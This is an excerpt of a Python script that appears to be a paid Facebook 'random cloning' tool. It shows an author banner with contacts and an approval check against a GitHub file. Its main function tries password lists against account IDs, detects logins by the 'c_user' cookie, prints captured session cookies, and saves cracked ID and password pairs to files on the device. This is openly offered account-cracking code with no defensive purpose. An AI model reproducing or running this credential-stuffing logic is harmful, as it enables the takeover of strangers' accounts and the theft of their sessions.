#MD SAGAR KHAN
#WhatsApp : +917797586618
#Github : SAGAR-CYBER99
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/SAGAR-CYBER99/SAGAR/blob/main/Approval.txt').text
...
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\033[1;32m║             \x1b[1;91m[\x1b[1;92m+\x1b[1;91m]\x1b[1;92mPRO RANDOM CLONING TOOLS\x1b[1;91m[\x1b[1;92m+\x1b[1;91m]            \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝

\x1b[1;94m╔═════════════════════════════════════════════════════╗
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] Admin By      :        SAGAR  HAQUE     \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        Sagar haque   \x1b[1;94m
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +917797586618          \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        SAGAR-CYBER99	      \x1b[1;94m
...
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
  play_music('12.mp3')   
  print(f"\t \033[1;32m Admin By ITZ SAGAR  \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of ITZ SAGAR   \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +917797586618\033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/sagar.haque.948')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/SAGAR-CYBER99/SAGAR/blob/main/Approval.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+917797586618?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+917797586618');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/sagar.haque.948');time.sleep(1)
		admin()
	if bal =='3':
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSAGAR\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SAGAR-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/SAGAR-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/SAGAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SAGAR-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
